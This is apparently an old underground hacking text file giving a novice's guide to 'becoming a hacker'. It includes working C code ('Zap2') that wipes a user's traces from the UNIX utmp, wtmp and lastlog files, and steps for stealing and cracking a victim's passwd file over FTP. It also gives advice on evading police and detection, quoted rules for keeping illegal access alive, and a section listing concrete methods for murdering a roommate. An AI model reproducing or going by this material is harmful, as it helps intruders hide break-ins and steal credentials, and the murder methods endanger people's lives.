1- How To Become A Hacker:
If You Think Hacking Is Getting Those Colored Screens like in the movie 
(HACKERS), Then You're In Deep Shit.
Let's Get A Basic idea about hacking...
Hacking Is not getting into NASA's computer and reading about yourself in 
the newspaper..NO NO NO.
Hacking is studying about computer systems, And Security flaws.
It's true that getting into NASA's computer makes you feel like you own the 
universe, but you wont own the universe until you learn a lot about 
computers, and explore It's world.
I know that you feel like lost, But here are some steps that will %100 teach 
you and lead you to the hacker world:
A- Search for (hacking text files, how to become a hacker, hacking UNIX 
systems, etc..) In the internet, you'll find a lot of them...
Download ALL the (hacking texts) you see, READ READ READ READ..
Now, You Don't Even Know Shit About Computers.
You still feel lost, There Are Somethings That Confuse you, i know it.
B- The fastest way to know more is to buy Some Books About Computer Hacking 
such as "HACKING EXPOSED" (my favourite), this book will TEACH you step by 
step how to get into UNIX, NT, Novel, And Netware.
C- You Have WINDOWS???
big mistake!! buy yourself "RedHat Linux", In order to follow what the books 
say you HAVE to get linux fast, buy it, or download it.
D- linux is hard for you?
ok, play with it  A LOT, After 6 Monthes you're ready to do what the books 
tell you.
E- you have hacked a system?
good, But Until now YOU ARE NOT A HACKER YET.
You have to learn C, C++, And ASM programming, when done of that, then 
you're a hacker.
--------------------

2- How To Erase UNIX logs:
Edit /etc/utmp, /usr/adm/wtmp and /usr/adm/lastlog. These are not text
files that can be edited by hand with vi, you must use a program
specifically written for this purpose.
Example:

#include
#include
#include
#include
#include
#include
#include
#include
#define WTMP_NAME "/usr/adm/wtmp"
#define UTMP_NAME "/etc/utmp"
#define LASTLOG_NAME "/usr/adm/lastlog"

int f;

void kill_utmp(who)
char *who;
{
    struct utmp utmp_ent;

  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
        while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
                          bzero((char *)&utmp_ent,sizeof( utmp_ent ));
                          lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
                          write (f, &utmp_ent, sizeof (utmp_ent));
                  }
        close(f);
  }
}

void kill_wtmp(who)
char *who;
{
    struct utmp utmp_ent;
    long pos;

    pos = 1L;
    if ((f=open(WTMP_NAME,O_RDWR))>=0) {

        while(pos != -1L) {
           lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
           if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
                pos = -1L;
           } else {
                if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
                        bzero((char *)&utmp_ent,sizeof(struct utmp ));
                        lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
                        write (f, &utmp_ent, sizeof (utmp_ent));
                        pos = -1L;
                } else pos += 1L;
           }
        }
        close(f);
  }
}

void kill_lastlog(who)
char *who;
{
    struct passwd *pwd;
    struct lastlog newll;

        if ((pwd=getpwnam(who))!=NULL) {

           if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
                  lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
                  bzero((char *)&newll,sizeof( newll ));
                  write(f, (char *)&newll, sizeof( newll ));
                  close(f);
           }

    } else printf("%s: ?\n",who);
}

main(argc,argv)
int argc;
char *argv[];
{
    if (argc==2) {
           kill_lastlog(argv[1]);
           kill_wtmp(argv[1]);
           kill_utmp(argv[1]);
           printf("Zap2!\n");
    } else
    printf("Error.\n");
}
--------------------

3- Gaining Information About A Specific Computer:
Ever wanted to know some information about your ISP? but you have windows?
ok,
first, you need to go to www.altavista.com, then search for "WhoIs 
Services",Go to a website that offers this command for free, now search for 
"target.com" without the "'s, you'll see that admin's name, and the 
location, and such information.
want some Emails on that computer?
just type\ @target.com
you see all of these members and phone numbers?
if you're up to it, you might try some kung fu!!
--------------------

4- Get the passwd file in the easy way!:
download a portscanner, scan your victim for open ports, if you dont know 
what the hell is goin' on, then you're in deep shit.
got the FTP port open?, ok if your vicitim is stupid (most of them are), 
then connect to FTP port and type "cat passwd", if you got that file, then 
type "get passwd" now you have the password file, crack it by any passwd 
cracker such as crackerjack or john the ripper.
if a * appears in the encrypted password section, then the passwd file is 
shawdowed, try to find the passwd file in another place.
dont know how does the shadowed file look like??
ok, here is one:
# $FreeBSD: src/etc/master.passwd,v 1.25 1999/09/13 17:09:07 peter Exp $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/sbin/nologin
operator:*:2:5:System &:/:/sbin/nologin
bin:*:3:7:Binaries Commands and Source,,,:/:/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/sbin/nologin
games:*:7:13:Games pseudo-user:/usr/games:/sbin/nologin
news:*:8:8:News Subsystem:/:/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/sbin/nologin
ftp:*:14:2000:EUA Anonymous FTP Server:/home/eua/ftp:/nonexistent
--------------------

5- What To Do If You Get Busted:
why are you reading this??
you think you're gonna get busted?
well, i just dont care, but here is what to do if you get busted by the 
feds:
A. Shut your mouth.
B. No matter what kind of deals they offer you, give them the finger, and 
ask for your phonecall, you have the right to ask for your phone call.
C. Call Someone, and get some help.
D. If they try to bother you, by speaking loud, or touching you, SCREAM as 
loud as you can, and tell them that your stomach hurts you!!! :)
E. If they talk about what you did, say "i dont understand what you're 
sayin' ", and act like a person who doesn't know what a computer is, you'll 
be free.
--------------------

6- The Hacker Personality:
Are you A hacker?
Is Reading UNIX manuals, or Learning programing makes you feel bored, while 
other friends, are out there drinking beer, and having fun??
well, We "HACKERS" can enjoy our work with the maximum fun!!
how?
ok..
I know that reading books suck, and Spending time on writing a program makes 
you feel bored, BUT!!
you can make learning a BEER, GIRLS, AND ROCK MUSIC PARTY!!!!!!! :)
How???
yes, ask me...
Call your GF, and your best friends, "hackers are recommended" with thier 
laptops of course!
tell them that you have a party in your place.
Leave this Keyboard and go buy the following:
A. 3 boxes of a great beer. "wine will make you forget Codes :) "
B. The Best Music CD In Stores.
C. Colored Lamps.
D. ORDER SOME FOOD.
When Others Come, The place should be like in SciFi movies, Loud Music, Dark 
place, And Compters, When HAckers Come, Enjoy A little, And start your 
computers, share programming, and HACK a little, dance and drink beer!!
that means you should mix your love of hacking and programming with the 
Entertainment, listen to RobZombie's music when hacking, Turn off the 
lights, And PARTY!!
we are Knowledge seekers, And FUN havers!
We should tell others that we're better than them, look at people who listen 
to "BackStreet Boys" they suck, they dont know shit About this world, they 
have no future, And look at us, we have fun 24 hours a day, and we read and 
program 24 hours a day, we are super in the class room, we are super in 
Parties, And super in our work in the future.
a real hacker can manage tens of networks, but a "BackStreet Boys" lover 
doesn't even know windows!
in few words, others are just cows! we're scintists and fun people!
--------------------

7- Killing Your Roomate:
So you have a roomate that bothers you like hell, and you're thinking to End 
his life??
well, i'm not a super anarchist but, i can destroy the world i guess..
there are several ways to kill that your roomate!
1- Take a needle and heat some horse shit and clean the shit of what the 
horse ate, take some human blood, mix it with the shit, heat them together 
very slowly, and when the ixture bubbles put it in the needle, you know what 
to do next! (that will kill him in a week)
2- Take a strong needle (i'm a DR.) put some gasoline in it, turn off the 
lights, insert the needle in a all lamps in the room, and get out, when your 
roomate turns the lights on, BOOM!!
3- When your roomate sleeps, Take a needle (haha), put some air, and insert 
the air inside your roomate blood stream, when the air bubbles go to the 
head, he'll pop!!
4- want to kill your roomate without touching him??
ok, get out of the room, outside you'll see the main electicity Boxs,open 
it... you'll see a large wire, cut it carefully ( touching the metal inside 
will make you a hotdog!), put the metal wires on the door handle, nock on 
the door (make sure the door is not metal too!), when your roomate touchs 
the door handle, zenzeen zeeeenzenen ahhhhhh ahh!
he's dead!
--------------------

8- Books You SHOULD have:
the following books are the best to learn hacking, and are the best to keep 
you a hacker...
1- HACKING EXPOSED.
2- Maximum linux security.
3- C for bigenners.
4- Learn linux in 24 hours.
5- The fugitive game. (Kevin Mitnick's Story)

--------------------

9- Our Words:
Hackers are born to read, explore, and create....
No matter what they do with thier knowledge, There is nothing called HACKERS 
VS CRACKERS, we are all hackers, We are all some of the best people on 
earth, Beacause, we run the most important things on this planet, we take 
care of the most dangerous things on this planet, All of us have the ability 
to do that, but there is good and evil, this is the life...
Some people use thier knowledge for good, and some of them use it to harm 
others.
We dont care what people say about us, some of them think that we're 
geniusses, some of them think that we're sci-fi movie lovers...
because they cant do what we do, they hate to learn important things, 
because it's hard to them, all they care about is (BackStreet Boys, 
BasketBall, And Money), isn't that right????
So, i wont talk much about this, our words to the BackStret Boys fans, Don't 
Ever think that your something big, wanna be big?
READ, EXPLORE, AND CREATE! (not "Backstreet's Back alright" ) hahahaa.

--------------------

10- Important Things:
These Words Are copied from one of the first text files i've read to become 
a hacker, it was written by "VoiD", They Are very important to know:

I.    Do not intentionally damage *any* system.
II.   Do not alter any system files other than ones needed to ensure your
      escape from detection and your future access (Trojan Horses, Altering
      Logs, and the like are all necessary to your survival for as long as
      possible.)
III.  Do not leave your (or anyone else's) real name, real handle, or real
      phone number on any system that you access illegally.  They *can* and
      will track you down from your handle!
IV.   Be careful who you share information with.  Feds are getting trickier.
      Generally, if you don't know their voice phone number, name, and
      occupation or haven't spoken with them voice on non-info trading
      conversations, be wary.
V.    Do not leave your real phone number to anyone you don't know.  This
      includes logging on boards, no matter how k-rad they seem.  If you
      don't know the sysop, leave a note telling some trustworthy people
      that will validate you.
VI.   Do not hack government computers.  Yes, there are government systems
      that are safe to hack, but they are few and far between.  And the
      government has inifitely more time and resources to track you down 
than
      a company who has to make a profit and justify expenses.
VII.  Don't use codes unless there is *NO* way around it (you don't have a
      local telenet or tymnet outdial and can't connect to anything 800...)
      You use codes long enough, you will get caught.  Period.
VIII. Don't be afraid to be paranoid.  Remember, you *are* breaking the law.
      It doesn't hurt to store everything encrypted on your hard disk, or
      keep your notes buried in the backyard or in the trunk of your car.
      You may feel a little funny, but you'll feel a lot funnier when you
      when you meet Bruno, your transvestite cellmate who axed his family to
      death.
IX.   Watch what you post on boards.  Most of the really great hackers in 
the
      country post *nothing* about the system they're currently working
      except in the broadest sense (I'm working on a UNIX, or a COSMOS, or
      something generic.  Not "I'm hacking into General Electric's Voice 
Mail
      System" or something inane and revealing like that.)
X.    Don't be afraid to ask questions.  That's what more experienced 
hackers
      are for.  Don't expect *everything* you ask to be answered, though.
      There are some things (LMOS, for instance) that a begining hacker
      shouldn't mess with.  You'll either get caught, or screw it up for
      others, or both.
XI.   Finally, you have to actually hack.  You can hang out on boards all 
you
      want, and you can read all the text files in the world, but until you
      actually start doing it, you'll never know what it's all about.  
There's
      no thrill quite the same as getting into your first system (well, ok,
      I can think of a couple of bigger thrills, but you get the picture.)

--------------------

11- Password List:
well, some of you know what to do with this, some of you dont, anyway, you 
can use this for a password cracker, which uses word lists to crack 
passwords, or you can ENJOY readin' it!  hahahahaha :^)
